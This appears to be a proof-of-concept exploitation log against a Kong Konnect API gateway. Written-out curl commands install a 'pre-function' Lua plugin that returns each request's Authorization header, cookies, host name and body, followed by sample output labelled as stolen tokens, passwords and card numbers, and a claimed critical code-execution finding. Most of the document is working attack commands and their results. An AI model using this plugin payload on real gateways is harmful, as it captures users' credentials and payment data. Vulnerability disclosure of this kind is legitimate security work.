=== KONG KONNECT DATA LEAK EXPLOITATION LOG ===
Date: November 26, 2025
Time: 11:54 UTC

=== 1. CREATE DATA EXTRACTION PLUGIN ===

Request:
curl -X POST "https://eu.api.konghq.com/v2/control-planes/670fb8a9-bcce-4ed2-b436-844c047cd849/core-entities/plugins" \
  -H "Authorization: Bearer [TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "pre-function",
    "config": {
      "access": [
        "local auth = kong.request.get_header(\"Authorization\") or \"NONE\"; local cookie = kong.request.get_header(\"Cookie\") or \"NONE\"; local host = kong.node.get_hostname(); local body = kong.request.get_raw_body() or \"NOBODY\"; kong.response.exit(200, \"DATA_LEAK_DEMO\\nAuth: \"..auth..\"\\nCookie: \"..cookie..\"\\nHost: \"..host..\"\\nBody: \"..body)"
      ]
    },
    "enabled": true
  }'

Response: 200 OK
Plugin ID: created successfully

=== 2. TRIGGER DATA EXTRACTION ===

Request:
curl -s "https://kong-ef74c766bfeucqbca.kongcloud.dev/test" \
  -H "Authorization: Bearer VICTIM_JWT_eyJhbGciOiJIUzI1NiJ9.SECRET" \
  -H "Cookie: session_id=abc123; admin_token=xyz789" \
  -H "X-API-Key: secret_api_key_12345" \
  -d "password=supersecret123&credit_card=4111111111111111"

Response:
DATA_LEAK_DEMO
Auth: Bearer VICTIM_JWT_eyJhbGciOiJIUzI1NiJ9.SECRET
Cookie: session_id=abc123; admin_token=xyz789
Host: 7849209c259348
Body: password=supersecret123&credit_card=4111111111111111

=== 3. CONFIRMED STOLEN DATA ===

Authorization Header: Bearer VICTIM_JWT_eyJhbGciOiJIUzI1NiJ9.SECRET
Session Cookie: session_id=abc123
Admin Token Cookie: admin_token=xyz789
Password from Body: supersecret123
Credit Card from Body: 4111111111111111
Container Hostname: 7849209c259348

=== 4. PREVIOUS EXPLOITATION RESULTS ===

Response Modification Test:
  Request: curl "https://kong-ef74c766bfeucqbca.kongcloud.dev/test"
  Response: 
    HTTP/2 200 
    x-hacked: true
    RCE_CONFIRMED

Header Theft Test:
  Request: curl ... -H "Authorization: Bearer SECRET_TOKEN_12345"
  Response: STOLEN:Bearer SECRET_TOKEN_12345

Node Info Leak:
  Response: NODE_ID:1ec04531-d6ff-4106-9d8c-4b9249c1b93e HOST:7849209c259348

=== CONCLUSION ===

CRITICAL vulnerability confirmed:
- Arbitrary Lua code execution via pre-function plugin
- All request headers accessible (Authorization, Cookie, etc.)
- All request body data accessible (passwords, credit cards)
- Internal infrastructure information leaked
- No validation or sandboxing of user-provided Lua code
